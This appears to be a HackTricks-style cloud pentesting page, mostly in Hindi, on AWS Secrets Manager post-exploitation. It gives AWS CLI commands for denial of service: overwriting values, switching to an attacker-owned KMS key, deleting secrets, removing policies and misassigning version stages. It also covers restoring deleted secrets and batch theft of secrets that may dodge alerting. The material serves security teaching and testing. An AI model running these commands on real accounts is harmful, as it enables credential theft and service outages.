# AWS - Secrets Manager Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Read Secrets

**secrets स्वयं संवेदनशील जानकारी हैं**, [check the privesc page](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) यह जानने के लिए कि इन्हें कैसे पढ़ा जाए।

### DoS Change Secret Value

secret के मान को बदलकर आप उन सभी सिस्टमों को **DoS** कर सकते हैं जो उस मान पर निर्भर करते हैं।

> [!WARNING]
> ध्यान दें कि पिछले मान भी संग्रहीत रहते हैं, इसलिए पहले वाले मान पर वापस जाना आसान है।
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

यदि हमलावर के पास secretsmanager:UpdateSecret अनुमति है, तो वे secret को ऐसे KMS key का उपयोग करने के लिए कॉन्फ़िगर कर सकते हैं जो हमलावर के स्वामित्व में हो। वह key शुरू में इस तरह सेट की जाती है कि कोई भी उससे एक्सेस और उपयोग कर सके, इसलिए secret को नई key के साथ अपडेट करना संभव होता है। यदि वह key उपलब्ध नहीं होती, तो secret को अपडेट नहीं किया जा सकता था।

secret के लिए key बदलने के बाद, हमलावर अपनी key की कॉन्फ़िगरेशन बदल देता है ताकि केवल वही ही उसे एक्सेस कर सके। इस तरह, secret के अगले वर्ज़नों में वह नई key से एन्क्रिप्ट होगा, और क्योंकि उस key तक पहुँच नहीं होगी, secret को पुनः प्राप्त करने की क्षमता खो जाएगी।

यह ध्यान रखना महत्वपूर्ण है कि यह अनुपलब्धता केवल बाद के वर्ज़नों में ही होगी, जब secret की सामग्री बदल जाएगी, क्योंकि वर्तमान वर्ज़न अभी भी मूल KMS key से एन्क्रिप्टेड है।
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

एक secret को delete करने के लिए न्यूनतम दिनों की संख्या 7 है।
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

यह संभव है कि आप किसी secret को restore कर सकें, जो उन secrets को पुनर्स्थापित करने की अनुमति देता है जिन्हें deletion के लिए शेड्यूल किया गया है, क्योंकि secrets के लिए न्यूनतम deletion अवधि 7 दिन और अधिकतम 30 दिन है। secretsmanager:GetSecretValue permission के साथ मिलकर, यह उनकी सामग्री प्राप्त करने में सक्षम बनता है।

जिस secret को हटाने की प्रक्रिया में रखा गया है उसे recover करने के लिए, आप निम्नलिखित command का उपयोग कर सकते हैं:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

यह क्रिया उस resource policy को हटाने की अनुमति देती है जो नियंत्रित करती है कि कौन किसी secret तक पहुँच सकता है।  

यदि resource policy को किसी विशिष्ट उपयोगकर्ताओं के समूह को एक्सेस की अनुमति देने के लिए कॉन्फ़िगर किया गया था, तो यह DoS का कारण बन सकता है।  

Resource policy हटाने के लिए:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

एक secret की स्थितियाँ उसके संस्करणों का प्रबंधन करने के लिए उपयोग की जाती हैं। AWSCURRENT उस सक्रिय संस्करण को चिह्नित करता है जिसका उपयोग एप्लिकेशन करते हैं, AWSPREVIOUS पिछले संस्करण को रखता है ताकि आवश्यक होने पर आप रोलबैक कर सकें, और AWSPENDING रोटेशन प्रक्रिया में किसी नए संस्करण को current बनाने से पहले उसे तैयार और सत्यापित करने के लिए उपयोग होता है।

एप्लिकेशन हमेशा AWSCURRENT वाले संस्करण को पढ़ते हैं। यदि कोई वह लेबल गलत संस्करण पर स्थानांतरित कर देता है, तो एप्स अमान्य क्रेडेंशियल्स का उपयोग करेंगे और विफल हो सकते हैं।

AWSPREVIOUS स्वतः उपयोग में नहीं आता। हालांकि, यदि AWSCURRENT हटा दिया जाए या गलत तरीके से पुनः असाइन किया जाए, तो ऐसा प्रतीत हो सकता है कि सब कुछ अभी भी पिछले संस्करण पर चल रहा है।
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../../banners/hacktricks-training.md}}





### Mass Secret Exfiltration via BatchGetSecretValue (up to 20 per call)

Secrets Manager BatchGetSecretValue API का दुरुपयोग करके एक ही अनुरोध में अधिकतम 20 secrets प्राप्त करें। यह प्रत्येक secret के लिए GetSecretValue को दोहराने की तुलना में API-कॉल की मात्रा को नाटकीय रूप से कम कर सकता है। यदि filters (tags/name) इस्तेमाल किए जाते हैं, तो ListSecrets अनुमति भी आवश्यक है। CloudTrail तब भी बैच में प्राप्त प्रत्येक secret के लिए एक GetSecretValue इवेंट रिकॉर्ड करता है।

आवश्यक अनुमतियाँ
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue — प्रत्येक लक्षित secret के लिए
- secretsmanager:ListSecrets — यदि --filters का उपयोग कर रहे हैं
- kms:Decrypt — उन CMKs पर जिनका उपयोग secrets द्वारा किया गया है (यदि aws/secretsmanager का उपयोग नहीं कर रहे हैं)

> [!WARNING]
> ध्यान दें कि अनुमति `secretsmanager:BatchGetSecretValue` अकेले secrets प्राप्त करने के लिए पर्याप्त नहीं है; आपको प्रत्येक secret को प्राप्त करने के लिए `secretsmanager:GetSecretValue` भी चाहिए।

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Exfiltrate द्वारा filters (tag key/value या name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
आंशिक विफलताओं को संभालना
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
प्रभाव
- कम API calls के साथ कई secrets का त्वरित “smash-and-grab”, संभावित रूप से उन alerting को बायपास कर सकता है जो GetSecretValue के spikes पर tuned हैं।
- CloudTrail logs में batch द्वारा retrieve किए गए प्रत्येक secret के लिए अभी भी एक GetSecretValue event शामिल होता है।
